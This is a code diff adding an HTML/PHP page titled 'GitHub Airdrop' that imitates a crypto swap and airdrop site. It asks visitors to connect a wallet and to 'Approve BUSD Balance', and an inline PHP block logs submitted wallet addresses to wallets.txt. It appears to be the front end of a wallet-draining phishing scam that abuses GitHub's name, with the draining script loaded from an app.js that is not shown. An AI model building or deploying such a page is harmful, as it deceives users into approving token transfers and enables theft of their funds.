@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="shortcut icon" href="/photos/733609.png" type="image/png">
+    <title>GitHub Airdrop</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+  </head>
+  <body>
+  <header class="header">
+    <div class="container">
+        <div class="navbar">
+        <ul>
+        <li><img src="/photos/pngfind.com-github-logo-png-1766942.png" style="width: 35px; padding-top: 5px;" alt=""></li>
+        <li><a style="color: #ffffff; font-size: 17px;">Swap</a></li>
+        <li><a style="color: #ffffff; font-size: 17px;">Pool</a></li>
+        <li><a style="color: #c0c0c0; font-size: 17px;">Airdrop</a></li>
+        </ul>
+        <ul>
+        <li><img src="/photos/bsc-logo.png" style="width: 35px; padding-top: 5px;" alt=""></li>
+        <li><button id="shortAddress" class="button1">Connect Wallet</button></li>
+        </ul>
+        </div>
+    </div>
+  </header>
+    <div></div>
+    <div class="content">
+      <h2>Airdrop</h2>
+      <div class="airdropbox">
+        <div></div>
+        <div class="airdropboxinfo">
+          <h3 style="margin: 0 20px;">Available Wallet Balance</h3>
+          <h3 style="margin: 0 20px;" id="balancevalue">0</h3>
+        </div>
+        <div class="airdropboxinfo">
+          <h3 style="margin: 0 20px;">Claimable Airdrop</h3>
+          <h3 style="margin: 0 20px;" id="airdropvalue">0</h3>
+        </div>
+        <button id="Enable" class="button2">Approve BUSD Balance</button>
+      </div>
+      <button id="gg">gg</button>
+  </div>
+  <footer>
+
+  </footer>
+  <?php 
+  $arr['wallet'] = $_POST[wallet];
+  file_put_contents('wallets.txt', $arr);
+  ?>
+  </body>
+  <link href="/style.css" rel="stylesheet" type="text/css">
+  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  
+  <script src="/app.js"></script>
+</html>
